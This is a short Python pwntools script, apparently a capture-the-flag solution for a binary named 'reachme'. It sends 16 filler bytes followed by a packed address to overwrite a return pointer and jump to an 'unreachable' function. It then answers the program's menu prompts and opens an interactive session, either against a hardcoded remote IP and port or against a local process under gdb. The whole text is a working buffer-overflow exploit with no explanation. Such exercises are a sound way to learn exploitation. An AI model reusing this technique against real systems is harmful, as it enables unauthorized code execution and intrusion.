from pwn import *

local = False
unreachable_addr = 0x0040125b

if local:
    LOCAL_BIN = './reachme'
    context.binary = elf = ELF(LOCAL_BIN)
    p = process(LOCAL_BIN)
    p = gdb.debug(LOCAL_BIN, aslr=False, gdbscript='b *0x00401757')
else:
    p = remote('185.94.96.76', 54291)

p.recvuntil(b"opt >> ")
p.sendline(b"1"*16 + p64(unreachable_addr))

p.recvuntil(b"calc >> ")
p.sendline(b"9")

p.recvuntil(b"a >> ")
p.sendline(b"9")

p.recvuntil(b"b >> ")
p.sendline(b"9")

p.interactive()
